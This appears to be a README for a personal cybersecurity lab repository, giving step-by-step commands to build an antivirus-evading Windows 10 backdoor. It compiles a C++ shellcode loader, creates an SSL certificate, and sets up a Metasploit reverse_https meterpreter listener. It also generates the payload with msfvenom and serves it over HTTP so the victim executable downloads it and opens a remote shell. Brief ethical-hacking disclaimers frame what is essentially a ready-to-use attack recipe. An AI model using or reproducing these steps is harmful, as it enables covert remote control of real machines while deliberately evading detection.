# Cyber Security
Cyber Security Lab Experiences by Fabio Felgueiras

Please note that this text contains references to potentially sensitive activities and materials.
It is important to use ethical hacking techniques responsibly and within legal boundaries.

In this example, i will demonstrate the use of Kali Linux 2023.2 to create a Windows 10 backdoor for ethical hacking purposes.

The following tools were utilized:
   - OpenSSL: Used to create the certificate.
   - msfconsole: Employed to create the listener and receive communication from the Windows machine.
   - msfvenom: Utilized to create the payload file.
   - Python: Used to create the HTTP server for payload delivery.
   - C++: Employed to create the Windows .exe file (backdoor.cpp).

For the coding of backdoor.cpp in C++, I referenced and customized code developed by TheD1rkMtr to suit my objectives. 
The code can be found at https://github.com/TheD1rkMtr/Shellcode-Hide/tree/main.

To ensure the executable is not detected as a virus, I combined the file SimpleLoader.cpp, which is flagged by Windows Defender and antivirus software, with the FilelessShellcode.cpp. This approach allows for the download of the payload on a remote machine, preventing detection. Additionally, SSL encryption with a custom certificate was implemented to secure the communication of the backdoor and prevent data detection.

It is essential to approach ethical hacking responsibly, adhering to legal frameworks and guidelines.

If you have any further questions or need clarification, feel free to ask!


Windows 10 Backdoor Creation

In Kali >

1- Download

    git clone https://github.com/Blive77/cybersecurity/
    cd cybersecurity
    
2- Compile backdoor.cpp

    x86_64-w64-mingw32-g++ --static -o backDoorTest.exe backdoor.cpp -fpermissive -lws2_32
      
3- Create custom SSL/TLS certificate 
    https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html

    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
    cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
    rm -f www.example.com.key  www.example.com.crt
    
      
4- Config the msfconsole Listener

    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set LHOST 0.0.0.0
    set LPORT 3333
    set HandlerSSLCert www.example.com.pem
    set StagerVerifySSLCert true
    set HandlerSSLCert /home/kali/cybersecurity/www.example.com.pem
    exploit
   
    
5- Create the Payload with msfvenom in Kali linux

   In my case:
   - Host IP= 192.168.235.132  
   - Host Port= 3333
   - Path To cert file= /home/kali/cybersecurity/www.example.com.pem
      
    msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
    
   
6- Setup the http webserver for Payload deliver (important to do this in the same folder the payload was created)

    python -m http.server
    
In Windows >
    
1- Execute the File created in point (2) "backDoorTest.exe"
    
    backDoorTest.exe ( can be execute with paramters IP, Port and PayLoad File ) 
 
